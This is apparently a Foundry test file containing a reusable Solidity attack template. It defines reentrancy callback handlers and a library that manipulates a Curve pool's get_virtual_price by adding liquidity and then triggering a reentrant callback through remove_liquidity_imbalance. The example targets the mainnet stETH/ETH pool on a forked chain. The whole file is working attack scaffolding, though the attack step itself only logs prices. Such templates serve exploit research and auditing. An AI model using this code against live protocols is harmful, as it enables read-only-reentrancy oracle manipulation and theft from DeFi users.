// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/utils/Tokens.sol";
import "forge-std/console.sol";

/**
 * Vulnerabilities stemming from Curve pool get_virtual_price manipulation can only occur
 * in pools where the underlying asset is ETH, or the underlying asset is a token which
 * makes a callback to the receiver on transfers
 */
abstract contract Reentrancy {

    enum State {
        PRE_ATTACK,
        ATTACK,
        POST_ATTACK
    }

    State reentrancyStage;

    /**
     * @dev Function run the first time the callback is entered
     */
    function _executeAttack() internal virtual;

    /**
     * @dev Function run after the attack is executed
     */
    function _completeAttack() internal virtual;

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal virtual {
        console.log(">>> Execute attack");
        _executeAttack();
    }

    /**
     * @dev Handles the receipt of ERC677 token type.
     */
    function onTokenTransfer(address, uint256, bytes memory) external returns (bool) {
        _reentrancyCallback();
        return true;
    }

    /**
     * @dev Handles the receipt of ERC1363 token type.
     */
    function onTransferReceived(address, address, uint256, bytes memory) external returns (bytes4) {
        _reentrancyCallback();
        return this.onTransferReceived.selector;
    }

    /**
     * @dev Handles the receipt of a single ERC1155 token type. This function is
     * called at the end of a `safeTransferFrom` after the balance has been updated.
     */
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC1155Received.selector;
    }

    /**
     * @dev Handles the receipt of a multiple ERC1155 token types. This function
     * is called at the end of a `safeBatchTransferFrom` after the balances have
     * been updated.
     */
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        returns (bytes4)
    {
        _reentrancyCallback();
        return this.onERC1155BatchReceived.selector;
    }

    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     */
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC721Received.selector;
    }

    /**
     * @dev Fallback function called when no other functions match the function signature
     */
    fallback() external payable virtual {
        _reentrancyCallback();
    }

    /**
     * @dev Function called when native asset is sent with no calldata
     */
    receive() external payable virtual {
        _reentrancyCallback();
    }

    /**
     * @dev We need to implement this function to tell contracts we support their callback interface
     * @return true Always returns true
     */
    function supportsInterface(bytes4) public pure returns (bool) {
        return true;
    }

}

abstract contract PriceManipulation is Reentrancy {

    using PriceManipulationProvider for PriceManipulationProviders;

    /**
     * @dev Price oracle provider call stack
     */
    PriceManipulationProviders[] internal _pmps;

    /**
     * @dev Manipulates the price of a given token pair by calling the manipulatePrice function on a PriceManipulationProviders contract.
     * @param pmp The PriceManipulationProviders contract instance.
     * @param token0 The address of the first token to manipulate.
     * @param token1 The address of the second token to manipulate.
     * @param amount0 The amount of the first token.
     * @param amount1 The amount of the second token.
     */
    function manipulatePrice(
        PriceManipulationProviders pmp,
        address token0,
        address token1,
        uint256 amount0,
        uint256 amount1
    ) internal virtual {
        manipulatePrice(pmp, IERC20(token0), IERC20(token1), amount0, amount1);
    }

    /**
     * @dev Manipulates the price of a given token pair by calling the manipulatePrice function on a PriceManipulationProviders contract.
     * @param pmp The PriceManipulationProviders contract instance.
     * @param token0 The IERC20 contract instance of the first token to manipulate.
     * @param token1 The IERC20 contract instance of the second token to manipulate.
     * @param amount0 The amount of the first token.
     * @param amount1 The amount of the second token.
     */
    function manipulatePrice(
        PriceManipulationProviders pmp,
        IERC20 token0,
        IERC20 token1,
        uint256 amount0,
        uint256 amount1
    ) internal virtual {
        _pmps.push(pmp);
        pmp.manipulatePrice(token0, token1, amount0, amount1);
        _pmps.pop();
    }

    /**
     * @dev Returns the top most provider from the call stack
     * @return pmp The current flash loan provider context
     */
    function currentPriceOracleProvider() internal view returns (PriceManipulationProviders pmp) {
        if (_pmps.length > 0) {
            return _pmps[_pmps.length - 1];
        }
        return PriceManipulationProviders.NONE;
    }

    /**
     * @dev Executes the attack logic for the price manipulation
     */
    function _executeAttack() internal virtual override;

    /**
     * @dev Completes the attack logic
     */
    function _completeAttack() internal virtual override;

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal virtual override {
        if (_pmps.length > 0) {
            PriceManipulationProviders pmp = currentPriceOracleProvider();
            if (pmp.callbackFunctionSelector() == "" || pmp.callbackFunctionSelector() == bytes4(msg.data[:4])) {
                _executeAttack();
                bytes memory returnData = pmp.returnData();
                assembly {
                    let len := mload(returnData)
                    return(add(returnData, 0x20), len)
                }
            }
        }
    }

}

library CurvePriceManipulation {

    struct Context {
        ICurvePoolRegistry poolRegistry;
    }

    /**
     * @dev Manipulates the price in a Curve pool by adding and removing liquidity.
     * @param token0 Address of the first token in the pool.
     * @param token1 Address of the second token in the pool.
     * @param amount0 The amount of token0 to add to the pool.
     * @param amount1 The amount of token1 to add to the pool.
     */
    function manipulatePoolPrice(IERC20 token0, IERC20 token1, uint256 amount0, uint256 amount1) internal {
        Context memory context1 = context();

        ICurvePool curvePool = ICurvePool(context1.poolRegistry.find_pool_for_coins(address(token0), address(token1)));

        uint256[2] memory amounts;
        amounts[0] = amount0;
        amounts[1] = amount1;

        if (token0 != EthereumTokens.ETH) {
            token0.approve(address(curvePool), 0);
            token0.approve(address(curvePool), type(uint256).max);
        }
        token1.approve(address(curvePool), 0);
        token1.approve(address(curvePool), type(uint256).max);

        curvePool.add_liquidity{value: token0 == EthereumTokens.ETH ? amount0 : 0}(amounts, 0);

        IERC20 lp_token = IERC20(curvePool.lp_token());

        amounts[0] = lp_token.balanceOf(address(this)) * curvePool.balances(0) / lp_token.totalSupply();
        amounts[1] = lp_token.balanceOf(address(this)) * curvePool.balances(1) / lp_token.totalSupply();

        // Trigger callback
        curvePool.remove_liquidity_imbalance(amounts, type(uint256).max);
    }

    /**
     * @dev Returns the context information for the curve pool registry.
     * @return Context The context information.
     */
    function context() internal view returns (Context memory) {
        ICurvePoolRegistry poolRegistry;
        if (block.chainid == 1) {
            // Ethereum mainnet
            poolRegistry = ICurvePoolRegistry(0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5);
        } else {
            revert("CurvePriceManipulation: Chain not supported");
        }

        return Context(poolRegistry);
    }

}

interface ICurvePoolRegistry {

    function find_pool_for_coins(address token0, address token1) external view returns (address);

}

interface ICurvePool {

    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity(uint256 amount, uint256[2] memory minAmounts) external returns (uint256);
    function remove_liquidity_imbalance(uint256[2] memory amounts, uint256 maxBurnAmount) external returns (uint256);
    function balances(uint256 i) external view returns (uint256);
    function lp_token() external view returns (address);
    function get_virtual_price() external view returns (uint256);

}

enum PriceManipulationProviders {
    NONE,
    CURVE
}

library PriceManipulationProvider {

    /**
     * @dev Function to manipulate price using different price manipulation providers.
     * @param pmp The price manipulation provider to use. ex: CURVE.
     * @param token0 First token involved in the price manipulation.
     * @param token1 Second token involved in the price manipulation.
     * @param amount0 Amount of token0 involved in the price manipulation.
     * @param amount1 Amount of token1 involved in the price manipulation.
     */
    function manipulatePrice(
        PriceManipulationProviders pmp,
        IERC20 token0,
        IERC20 token1,
        uint256 amount0,
        uint256 amount1
    ) internal {
        if (pmp == PriceManipulationProviders.CURVE) {
            CurvePriceManipulation.manipulatePoolPrice(token0, token1, amount0, amount1);
        } else {
            revert("PriceManipulationProvider: Provider doesn't support single token flash loans");
        }
    }

    /**
     * @dev Gets the bytes4 function selector for the intended callback
     * @param pmp The price oracle provider to get the callback selector of
     * @return The bytes4 function selector for the intended callback.
     */
    function callbackFunctionSelector(PriceManipulationProviders pmp) internal pure returns (bytes4) {
        // if (pmp == PriceManipulationProviders.CURVE) {
        //     return CurvePriceManipulation.CALLBACK_SELECTOR;
        // }
    }

    /**
     * @dev Gets the bytes32 return data for the intended callback
     * @param pmp The price oracle provider to get the return data of
     * @return The bytes32 return data for the intended callback.
     */
    function returnData(PriceManipulationProviders pmp) internal pure returns (bytes memory) {
        // if (pmp == PriceManipulationProviders.CURVE) {
        //     return CurvePriceManipulation.RETURN_DATA;
        // }
    }

}

contract PriceManipulationTemplate is PriceManipulation, Test {

    // stETH / ETH Curve pool
    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);

    function initiateAttack() external {
        // In this example we are dealing ETH and stETH to an attacker to use for price manipulation
        // of the stETH / ETH Curve pool. This allows us to manipulate the virtual price of the asset
        // for an attack on a protocol which relies on the data from this oracle
        deal(address(this), 100_000e18);
        // Submit half our ETH to the stETH contract to get the stETH we need
        IstETH(address(EthereumTokens.stETH)).submit{value: 50_000e18}(address(0x0));
        console.log("Virtual price before:", pool.get_virtual_price());
        manipulatePrice(
            PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50_000e18, 50_000e18
        );
        _completeAttack();
    }

    function _executeAttack() internal view override {
        // Execute attack and use flash loaned funds here
        console.log("Virtual price during:", pool.get_virtual_price());
    }

    function _completeAttack() internal view override {
        // Finish attack
        console.log("Virtual price after :", pool.get_virtual_price());
    }

}

interface IstETH {

    function submit(address referrel) external payable;

}

contract PriceManipulationTest is Test {

    uint256 mainnetFork;

    PriceManipulationTemplate public attackContract;

    function setUp() public {
        mainnetFork = vm.createSelectFork("mainnet", 17_626_926);
        attackContract = new PriceManipulationTemplate();
    }

    function testPriceManipulationAttack() public {
        attackContract.initiateAttack();
    }

}
